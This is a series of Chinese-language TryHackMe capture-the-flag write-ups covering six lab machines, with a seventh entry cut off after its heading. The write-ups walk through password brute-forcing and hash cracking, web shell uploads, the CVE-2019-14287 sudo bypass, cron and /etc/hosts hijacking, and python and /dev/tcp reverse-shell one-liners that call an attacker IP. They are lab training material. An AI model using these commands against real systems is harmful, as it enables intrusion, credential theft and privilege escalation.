entry.title: TryHackMe_Year of the Rabbit
entry.content:
Year of the Rabbit

Time to enter the warren…

端口扫描

序号Host地址端口协议Uri地址标题Banner状态码
110.48.175.14622SSH10.48.175.146:22OpenSSH 6.7p1 Debian 50
210.48.175.14621FTP10.48.175.146:21Vsftpd 3.0.20
310.48.175.14680HTTPhttp://10.48.175.146:80Apache2 Debian Default Page: It worksApache/2.4.10 (Debian), Apache-Web-Server, Apache2 默认页, Apache-HTTP-Server/2.4.10, Apache-HTTP-Server-Debian, Apache2Debian默认页200

目录扫描得到 /assets，访问是一个文件目录，点击 /style.css，里面藏有一个新地址

/sup3r_s3cr3t_fl4g.php

访问该地址会出现提示关闭 js，既然如此那就直接 burpsuite 抓包，在这过程中又看到了一个隐藏文件夹

/WExYY2Cv-qU

访问是一张图片，下载后使用 strings 命令查看，得到了 ftp 的用户名 ftpuser 以及一个密码字典

┌──(root㉿kali)-[~/桌面]└─# strings Hot_Babe.png                                       ...Eh, you've earned this. Username for FTP is ftpuserOne of these is the password:Mou+56n%QK8sr0rJ7p%6Axm05K94rU30Zx45z5c...Vi^Qf+u%0*q_S1Fvdp&bNl3#&lzLH%Ot0Bw&c%9

使用 hydra 破解得到密码 5iez1wGXKfPKQ

┌──(root㉿kali)-[~/桌面]└─# hydra -l ftpuser -P passwd.txt ftp://10.48.175.146Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-17 17:34:43[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task[DATA] attacking ftp://10.48.175.146:21/[21][ftp] host: 10.48.175.146   login: ftpuser   password: 5iez1wGXKfPKQ1 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-17 17:34:58

ftp 登录，有一个文本，将其下载下来

┌──(root㉿kali)-[~/桌面]└─# ftp 10.48.175.146             Connected to 10.48.175.146.220 (vsFTPd 3.0.2)Name (10.48.175.146:root): ftpuser331 Please specify the password.Password: 230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp> ls -al229 Entering Extended Passive Mode (|||40760|).150 Here comes the directory listing.-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt226 Directory send OK.

查看是 Brainfuck 编码

┌──(root㉿kali)-[~/桌面]└─# cat Eli\'s_Creds.txt              +++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->---<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<++++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->-----<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >+++++<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++<]>+. <+++[ ->--- <]>-- ---.- ----. <

写个脚本来解码

code = """+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->---<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<++++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->-----<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >+++++<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++<]>+. <+++[ ->--- <]>-- ---.- ----. <"""# Brainfuck 解释器tape = [0] * 30000ptr = 0i = 0output = ""while i < len(code):    c = code[i]    if c == '>':        ptr += 1    elif c == '<':        ptr -= 1    elif c == '+':        tape[ptr] = (tape[ptr] + 1) & 0xFF    elif c == '-':        tape[ptr] = (tape[ptr] - 1) & 0xFF    elif c == '.':        output += chr(tape[ptr])    elif c == '[':        if tape[ptr] == 0:            depth = 1            while depth > 0:                i += 1                if code[i] == '[':                    depth += 1                elif code[i] == ']':                    depth -= 1    elif c == ']':        if tape[ptr] != 0:            depth = 1            while depth > 0:                i -= 1                if code[i] == '[':                    depth -= 1                elif code[i] == ']':                    depth += 1    i += 1print(output)

运行后得到登录凭证，使用此凭证成功登录 ssh

User: eli
Password: DSpDiM1wAEwid

同时在登录的时候还有一个提示，意思是在 s3cr3t 留了一个隐藏信息

┌──(root㉿kali)-[~/桌面]└─# ssh eli@10.48.175.146eli@10.48.175.146's password: 1 new messageMessage from Root to Gwendoline:"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"END MESSAGEeli@year-of-the-rabbit:~$ iduid=1000(eli) gid=1000(eli) groups=1000(eli),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),119(bluetooth)

寻找该地址，并查看该目录下的文件，得到了 gwendoline 的登录密码 MniVCQVhQHUNI

eli@year-of-the-rabbit:~$ find / -name s3cr3t 2>/dev/null/usr/games/s3cr3teli@year-of-the-rabbit:~$ cd /usr/games/s3cr3teli@year-of-the-rabbit:/usr/games/s3cr3t$ ls -altotal 12drwxr-xr-x 2 root root 4096 Jan 23  2020 .drwxr-xr-x 3 root root 4096 Jan 23  2020 ..-rw-r--r-- 1 root root  138 Jan 23  2020 .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!eli@year-of-the-rabbit:/usr/games/s3cr3t$ cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\! Your password is awful, Gwendoline. It should be at least 60 characters long! Not just MniVCQVhQHUNIHonestly!Yours sincerely   -Root

成功登录

eli@year-of-the-rabbit:/usr/games/s3cr3t$ su gwendolinePassword: gwendoline@year-of-the-rabbit:/usr/games/s3cr3t$ iduid=1001(gwendoline) gid=1001(gwendoline) groups=1001(gwendoline)

这个 sudo 规则非常特别：可以以除了 root 以外的身份的身份无密码执行 /usr/bin/vi /home/gwendoline/user.txt

gwendoline@year-of-the-rabbit:~$ sudo -lMatching Defaults entries for gwendoline on year-of-the-rabbit:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/binUser gwendoline may run the following commands on year-of-the-rabbit:    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt

但是我们需要的就是 root 身份，谷歌搜索找到 sudo 绕过技巧 CVE-2019-14287

sudo -u#-1 允许用户以 root 身份执行命令，即使规则中写了 !root

在进入 vi 界面后，在命令模式输入 :!/bin/bash 即可提权

gwendoline@year-of-the-rabbit:~$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txtroot@year-of-the-rabbit:/home/gwendoline# iduid=0(root) gid=0(root) groups=0(root)
entry.summary: Year of the Rabbit

entry.title: TryHackMe_Brute It
entry.content:
Brute It

Learn how to brute, hash cracking and escalate privileges in this box!

端口扫描

序号Host地址端口协议Uri地址标题Banner状态码
110.49.187.17780HTTPhttp://10.49.187.177:80Apache2 Ubuntu Default Page: It worksApache2 Debian 默认页, Apache/2.4.29 (Ubuntu), Apache2 默认页, Apache-HTTP-Server-Ubuntu, apache2-ubuntu默认页面, Apache-Web-Server200
210.49.187.17722SSH10.49.187.177:22OpenSSH 7.6p1 Ubuntu 4ubuntu0.30

目录扫描得到 /admin，访问是一个登录页面，F12 得到用户名 admin

使用 hydra 暴力破解，得到密码 xavier

┌──(root㉿kali)-[~/桌面]└─# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.49.187.177 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid" -VHydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway)....[80][http-post-form] host: 10.49.187.177   login: admin   password: xavier

使用 admin:xavier 登录，里面有一个地址 /admin/panel/id_rsa，访问得到私钥

将私钥保存并赋予 600 权限，转化为哈希格式，再用 john 破解得到密码 rockinroll

┌──(root㉿kali)-[~/桌面]└─# chmod 600 id_rsa┌──(root㉿kali)-[~/桌面]└─# ssh2john id_rsa > id_rsa.hash┌──(root㉿kali)-[~/桌面]└─# john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash Using default input encoding: UTF-8Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashesCost 2 (iteration count) is 1 for all loaded hashesWill run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusrockinroll       (id_rsa)     1g 0:00:00:00 DONE (2026-05-17 13:32) 11.11g/s 806755p/s 806755c/s 806755C/s saloni..rock14Use the "--show" option to display all of the cracked passwords reliablySession completed.

前面注释里面有用户名 john，再添加上私钥登录 ssh

┌──(root㉿kali)-[~/桌面]└─# ssh john@10.49.187.177 -i id_rsaEnter passphrase for key 'id_rsa': Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106john@bruteit:~$ iduid=1001(john) gid=1001(john) groups=1001(john),27(sudo)

sudo -l 发现可以 root 无密码执行 /bin/cat

john@bruteit:~$ sudo -lMatching Defaults entries for john on bruteit:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser john may run the following commands on bruteit:    (root) NOPASSWD: /bin/cat

查看 /etc/shadow，得到 root 用户的密码哈希

john@bruteit:~$ sudo /bin/cat /etc/shadowroot:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::

依旧使用 john 破解得到 root 密码 football

┌──(root㉿kali)-[~/桌面]└─# echo 'root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::' > root.hash┌──(root㉿kali)-[~/桌面]└─# john --wordlist=/usr/share/wordlists/rockyou.txt root.hashUsing default input encoding: UTF-8Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])Cost 1 (iteration count) is 5000 for all loaded hashesWill run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusfootball         (root)     1g 0:00:00:00 DONE (2026-05-17 13:40) 4.545g/s 2327p/s 2327c/s 2327C/s 123456..letmeinUse the "--show" option to display all of the cracked passwords reliablySession completed.

切换用户成功提权

john@bruteit:~$ su rootPassword: root@bruteit:/home/john# iduid=0(root) gid=0(root) groups=0(root)
entry.summary:
Brute It

Learn how to brute, hash cracking

entry.title: TryHackMe_Startup
entry.content:
Startup

Abuse traditional vulnerabilities via untraditional means.

端口扫描

序号Host地址端口协议Uri地址标题Banner状态码
110.49.162.4921FTP10.49.162.49:21Vsftpd 3.0.30
210.49.162.4980HTTPhttp://10.49.162.49:80MaintenanceApache-Web-Server, Apache/2.4.18 (Ubuntu), Apache-HTTP-Server/2.4.18200
310.49.162.4922SSH10.49.162.49:22OpenSSH 7.2p2 Ubuntu 4ubuntu2.100

ftp 可以匿名登录，但是里面的文件没有任何有用信息，即使图片名字是 important

ftp> ls -al200 PORT command successful. Consider using PASV.150 Here comes the directory listing.drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 .drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..-rw-r--r--    1 0        0               5 Nov 12  2020 .test.logdrwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt226 Directory send OK.ftp: 389 bytes received in 0.01Seconds 29.92Kbytes/sec.

目录扫描得到 /files，访问是一个目录结构

但是好眼熟，这不就是 ftp 里面的文件吗，也就是说 ftp 里面的文件可以在网页上查看

先测试一下，用 put 随便上传一个文件

ftp> put 1.txt

可以访问

既然如此，那就上传一个 shell 文件

ftp> put shell.php5

访问，成功拿到 www-data 权限

www-data@startup: …/files/ftp # iduid=33(www-data) gid=33(www-data) groups=33(www-data)

搜索属于该用户的文件，有用的只有两个

www-data@startup:/home# find / -user www-data -type f 2>/dev/null/recipe.txt/incidents/suspicious.pcapng

查看 recipe.txt，得到了问题里面秘制辣汤的配方

www-data@startup:/# cat recipe.txtSomeone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.

还有一个 pcapng 就利用 wget 下载下来

查看 tcp 流，这里面尝试输入 www-data 的密码，但是错误，很显然，这个密码属于 lennie

c4ntg3t3n0ughsp1c3

由于是网页 shell，因此用 python 反弹到 kali

python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.206.169",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

用 script 创建一个伪终端，再切换至用户 lennie

┌──(root㉿kali)-[~/桌面]└─# nc -lvnp 4444listening on [any] 4444 ...connect to [192.168.80.128] from (UNKNOWN) [192.168.80.1] 7070bash: cannot set terminal process group (1216): Inappropriate ioctl for devicebash: no job control in this shellwww-data@startup:/incidents$ script /dev/nullscript /dev/nullScript started, file is /dev/null$ su lenniesu lenniePassword: c4ntg3t3n0ughsp1c3lennie@startup:/incidents$ ididuid=1002(lennie) gid=1002(lennie) groups=1002(lennie)

在 ~/scripts 文件夹里面有一个 planner.sh，且拥有读和执行的权限

该文件会将一个变量写入 startup_list.txt，同时会执行 /etc/print.sh

lennie@startup:~/scripts$ ls -altotal 16-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh-rw-r--r-- 1 root   root      1 May 17 04:36 startup_list.txtlennie@startup:~/scripts$ cat planner.sh#!/bin/bashecho $LIST > /home/lennie/scripts/startup_list.txt/etc/print.sh

查看 /etc/print.sh，发现拥有最高权限

lennie@startup:~/scripts$ ls -al /etc/print.shls -al /etc/print.sh-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh

修改该文件，写入 root 反弹命令

lennie@startup:~/scripts$ echo '#!/bin/bash' > /etc/print.shecho '#!/bin/bash' > /etc/print.shlennie@startup:~/scripts$ echo 'bash -c "bash -i >& /dev/tcp/192.168.206.169/4443 0>&1"' >> /etc/print.sh<dev/tcp/192.168.206.169/4443 0>&1"' >> /etc/print.sh

运行 .planner.sh

lennie@startup:~/scripts$ .planner.sh.planner.sh

成功提权

PS D:\netcat> .\nc64.exe -lvnp 4443listening on [any] 4443 ...connect to [192.168.206.169] from (UNKNOWN) [10.49.162.49] 51788bash: cannot set terminal process group (1700): Inappropriate ioctl for devicebash: no job control in this shellroot@startup:~# ididuid=0(root) gid=0(root) groups=0(root)
entry.summary:
Startup

Abuse traditional vulnerabilities via

entry.title: TryHackMe_Cyborg
entry.content:
Cyborg

A box involving encrypted archives, source code analysis and more.

端口扫描

序号Host地址端口协议Uri地址标题Banner状态码
110.48.185.1822SSH10.48.185.18:22OpenSSH 7.2p2 Ubuntu 4ubuntu2.100
210.48.185.1880HTTPhttp://10.48.185.18:80Apache2 Ubuntu Default Page: It worksApache-HTTP-Server/2.4.18, Apache2 默认页, Apache-HTTP-Server-Ubuntu, Apache-Web-Server, Apache/2.4.18 (Ubuntu), Apache2 Debian 默认页, apache2-ubuntu默认页面200

访问网站是一个 apache 默认页面，目录扫描得到 /etc 和 /admin

访问 /etc，是一个文件目录，在 /etc/squid/passwd 发现密码

这是一个 Apache MD5 (apr1) 格式的密码哈希

music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn。

使用 john 破解，得到明文

squidward

使用该账号密码登录 ssh 失败

┌──(root㉿kali)-[~/桌面]└─# echo 'music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.' > hash.txt                                                                                                                                   ┌──(root㉿kali)-[~/桌面]└─# john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txtUsing default input encoding: UTF-8Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statussquidward        (music_archive)     1g 0:00:00:00 DONE (2026-05-17 10:01) 3.030g/s 118690p/s 118690c/s 118690C/s 112806..lilicaUse the "--show" option to display all of the cracked passwords reliablySession completed.

继续访问 /admin，是一个很简单的页面，但是有一个下载地址，下载得到一个压缩包

解压

┌──(root㉿kali)-[~/桌面]└─# tar -xvf archive.tar home/field/dev/final_archive/home/field/dev/final_archive/hints.5home/field/dev/final_archive/integrity.5home/field/dev/final_archive/confighome/field/dev/final_archive/READMEhome/field/dev/final_archive/noncehome/field/dev/final_archive/index.5home/field/dev/final_archive/data/home/field/dev/final_archive/data/0/home/field/dev/final_archive/data/0/5home/field/dev/final_archive/data/0/3home/field/dev/final_archive/data/0/4home/field/dev/final_archive/data/0/1

查看 README，告诉我们这是一个 Borg 备份仓库，还给了项目地址

┌──(root㉿kali)-[~/桌面]└─# cat home/field/dev/final_archive/READMEThis is a Borg Backup repository.See https://borgbackup.readthedocs.io/

访问该仓库地址，阅读它的相关文档，可以使用 borg extract /path/to/repo::my-files 命令来提取归档文件

borg 命令可以通过 apt install borg 下载

/path/to/repo 就是刚才解压的路径 home/field/dev/final_archive/

my-files 应该是 music_archive，而且提取需要密码，前面和密码相关的也只有这个了

提取后 home 目录下多了一个 alex 文件夹

┌──(root㉿kali)-[~/桌面]└─# borg extract home/field/dev/final_archive/::music_archiveEnter passphrase for key /root/桌面/home/field/dev/final_archive: ┌──(root㉿kali)-[~/桌面]└─# cd home                                ┌──(root㉿kali)-[~/桌面/home]└─# ls -al                                                          总计 16drwxr-xr-x  4 root       root 4096  5月17日 10:16 .drwxr-xr-x  4 root       root 4096  5月17日 10:10 ..drwxr-xr-x 12 dockertest 1001 4096 2020年12月29日 alexdrwxr-xr-x  3 root       root 4096  5月17日 10:10 field

在 /home/alex/Documents 找到了一个登录凭证

┌──(root㉿kali)-[~/桌面/home/alex/Documents]└─# cat note.txt     Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!alex:S3cretP@s3

使用该凭证成功以 alex 用户登录 ssh

┌──(root㉿kali)-[~/桌面]└─# ssh alex@10.48.185.18        alex@10.48.185.18's password: Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.15.0-128-generic x86_64)alex@ubuntu:~$ iduid=1000(alex) gid=1000(alex) groups=1000(alex),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)

sudo -l 发现可以以 root 执行 /etc/mp3backups/backup.sh，同时还有读的权限

alex@ubuntu:~$ sudo -lMatching Defaults entries for alex on ubuntu:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser alex may run the following commands on ubuntu:    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.shalex@ubuntu:~$ ls -al /etc/mp3backups/backup.sh-r-xr-xr-- 1 alex alex 1083 Dec 30  2020 /etc/mp3backups/backup.sh

查看该脚本，接受一个 -c 参数，将其赋值给 command 变量

然后执行 cmd=$($command)，即以 root 权限执行任意命令，最后输出结果

alex@ubuntu:~$ cat /etc/mp3backups/backup.sh#!/bin/bashsudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txtinput="/etc/mp3backups/backed_up_files.txt"while getopts c: flagdo        case "${flag}" in                 c) command=${OPTARG};;        esacdone# ... 中间是备份代码 ...cmd=$($command)echo $cmd

直接提权，成功，但是执行命令却没有输出结果

这是因为虽然通过 -c 参数可以提权，但无法获得一个交互式 shell，这是因为脚本执行完命令后就退出了

alex@ubuntu:~$ sudo /etc/mp3backups/backup.sh -c "/bin/bash -p"find: ‘/run/user/108/gvfs’/home/alex/Music/image12.mp3...中间是备份文件...Backup finishedroot@ubuntu:~# id

那就直接通过命令方式读取 flag

alex@ubuntu:~$ sudo /etc/mp3backups/backup.sh -c "cat /root/root.txt"find: ‘/run/user/108/gvfs’: Permission denied...中间是备份文件...Backup finishedflag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
entry.summary:
Cyborg

A box involving encrypted archives, sourc

entry.title: TryHackMe_Overpass
entry.content:
Overpass

What happens when some broke CompSci students make a password manager?

端口扫描

序号Host地址端口协议Uri地址标题Banner状态码
110.49.181.2780HTTPhttp://10.49.181.27:80OverpassOverpass200
210.49.181.2722SSH10.49.181.27:22OpenSSH 8.2p1 Ubuntu 4ubuntu0.130

目录扫描得到 /admin，访问是一个登录页面，但是不知道账号密码

但是在 login.js 里面找到了一串 js 代码

前端向 /api/login 发送 POST 请求，后端返回一个字符串

如果返回 Incorrect credentials，提示密码错误

如果返回任何其他内容，前端就会：把这个内容作为 SessionToken 存入 Cookie，直接跳转到 /admin

const statusOrCookie = await response.text()if (statusOrCookie === "Incorrect credentials") {    loginStatus.textContent = "Incorrect Credentials"    passwordBox.value = ""} else {    Cookies.set("SessionToken", statusOrCookie)    window.location = "/admin"}

直接在控制台设置 cookie，然后跳转，成功登录

Cookies.set("SessionToken", "anything")window.location = "/admin"

将密码保存，赋予 600 权限，在使用 ssh2john 转化类型，最后用 john 破解，得到密码

james13

┌──(root㉿kali)-[~/桌面]└─# chmod 600 key   ┌──(root㉿kali)-[~/桌面]└─# ssh2john key > key.hash      ┌──(root㉿kali)-[~/桌面]└─# john --wordlist=/usr/share/wordlists/rockyou.txt key.hash      Using default input encoding: UTF-8Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashesCost 2 (iteration count) is 1 for all loaded hashesWill run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusjames13          (key)     1g 0:00:00:00 DONE (2026-05-16 18:57) 25.00g/s 334400p/s 334400c/s 334400C/s pink25..honoluluUse the "--show" option to display all of the cracked passwords reliablySession completed.

ssh 登录

┌──(root㉿kali)-[~/桌面]└─# ssh james@10.49.181.27 -i key      Enter passphrase for key 'key': Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1james@ip-10-49-181-27:~$ iduid=1001(james) gid=1001(james) groups=1001(james)

有一个 .overpass ，里面有一串字符编码

james@ip-10-49-181-27:~$ cat .overpass ,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.

rot47 解码得到 James 的密码

[{"name":"System","pass":"saydrawnlyingpicture"}]

查看定时任务，每分钟以 root 从 overpass.thm 下载脚本并执行

james@ip-10-49-181-27:~$ cat /etc/crontabSHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin# m h dom mon dow user  command17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )# Update builds from latest code* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash

该用户有对 /etc/hosts 的修改权限，修改文件将 overpass.thm 执行攻击机地址

注意写入后会默认在最后，而该文件第三行会将 overpass.thm 解析为本地地址，因此可以用 nano 将其注释掉

james@ip-10-49-181-27:~$ ls -la /etc/hosts-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hostsjames@ip-10-49-181-27:~$ echo "192.168.206.169 overpass.thm" >> /etc/hostsjames@ip-10-49-181-27:~$ cat /etc/hosts127.0.0.1 localhost127.0.1.1 overpass-prod#127.0.0.1 overpass.thm# The following lines are desirable for IPv6 capable hosts::1     ip6-localhost ip6-loopbackfe00::0 ip6-localnetff00::0 ip6-mcastprefixff02::1 ip6-allnodesff02::2 ip6-allrouters192.168.206.169 overpass.thm

本地创建 downloads/src/buildscript.sh ，并将反弹指令写入里面

┌──(root㉿kali)-[~/桌面]└─# echo '#!/bin/bash' > downloads/src/buildscript.sh                ┌──(root㉿kali)-[~/桌面]└─# echo 'bash -c "bash -i >& /dev/tcp/192.168.206.169/4444 0>&1"' >> downloads/src/buildscript.sh                    ┌──(root㉿kali)-[~/桌面]└─# chmod +x downloads/src/buildscript.sh

同时 python 开启静态服务

┌──(root㉿kali)-[~/桌面]└─# python3 -m http.server 80Serving HTTP on :: port 80 (http://[::]:80/) ...::ffff:10.49.181.27 - - [16/May/2026 19:23:58] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -

攻击机监听端口，等待靶机下载文件就行

┌──(root㉿kali)-[~/桌面]└─# nc -lvnp 4444listening on [any] 4444 ...connect to [192.168.80.128] from (UNKNOWN) [192.168.80.1] 5172bash: cannot set terminal process group (5977): Inappropriate ioctl for devicebash: no job control in this shellroot@ip-10-49-181-27:~# ididuid=0(root) gid=0(root) groups=0(root)
entry.summary:
Overpass

What happens when some broke Comp

entry.title: TryHackMe_LazyAdmin
entry.content:
LazyAdmin

Easy linux machine to practice your skills

端口扫描

序号Host地址端口协议Uri地址标题Banner状态码
110.48.130.12080HTTPhttp://10.48.130.120:80Apache2 Ubuntu Default Page: It worksApache2 默认页, Apache2Debian默认页, Apache-HTTP-Server-Ubuntu, apache2-ubuntu默认页面, Apache-HTTP-Server/2.4.18, Apache-Web-Server, Apache/2.4.18 (Ubuntu)200
210.48.130.12022SSH10.48.130.120:22OpenSSH 7.2p2 Ubuntu 4ubuntu2.80

目录扫描得到 /content，访问是一个由 SweetRice CMS 构建的网站，但是没有其他信息

继续目录扫描，首先得到 /content/as 目录，访问是一个登录页面，但是不知道密码，搜索相关漏洞，存在任意密码修改，但是不知道相关邮箱，只好作罢

同样还有 /content/inc 目录，是一个文件目录，其中 /content/inc/lastest.txt 得知 cms 版本为 1.5.1

还有一个 /content/inc/mysql_backup，里面有一个 sql 文件，下载后在里面找到账号密码

's:5:"admin";s:7:"manager";s:6:"passwd";s:32:"42f749ade7f9e195bf475f37a44cafcb";'

密码 md5 解密得到 Password123

manager

Password123

使用上述密码登录后台，在后台找到一个文件上传的地方，上传单文件 php shell 被拦截，修改后缀为 php5 成功上传

浏览器访问该文件

www-data@THM-Chal:…/content/attachment# iduid=33(www-data) gid=33(www-data) groups=33(www-data)www-data@THM-Chal:/home/itguy# cat user.txtTHM{63e5bce9271952aad1113b6f1ac28a07}

由于是网页环境，利用 python 反弹到攻击机

python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.206.169",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

执行 sudo -l，可以无密码以 root 权限执行 /usr/bin/perl /home/itguy/backup.pl

www-data@THM-Chal:/home/itguy$ sudo -lsudo -lMatching Defaults entries for www-data on THM-Chal:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser www-data may run the following commands on THM-Chal:    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

查看 backup.pl 文件以及权限，拥有执行权限但是没有修改权限

该命令会运行另外一个文件

www-data@THM-Chal:/home/itguy$ cat backup.plcat backup.pl#!/usr/bin/perlsystem("sh", "/etc/copy.sh");www-data@THM-Chal:/home/itguy$ ls -al backup.pl-rw-r--r-x  1 root  root    47 Nov 29  2019 backup.pl

查看 /etc/copy.sh 权限，可以进行修改

将提权语句写入该文件

www-data@THM-Chal:/home/itguy$ ls -la /etc/copy.shls -la /etc/copy.sh-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.shwww-data@THM-Chal:/home/itguy$ echo '#!/bin/sh' > /etc/copy.shecho '#!/bin/sh' > /etc/copy.shwww-data@THM-Chal:/home/itguy$ echo '/bin/bash -p' >> /etc/copy.shecho '/bin/bash -p' >> /etc/copy.sh

运行直接提权

www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.plsudo /usr/bin/perl /home/itguy/backup.pliduid=0(root) gid=0(root) groups=0(root)
entry.summary:
LazyAdmin

Easy linux machine to practic

entry.title: TryHackMe_Simple CTF
entry.content:
Simple CTF

Beginner level ctf

端口扫描

序号Host地址端口协议Uri地址标题Banner状态码
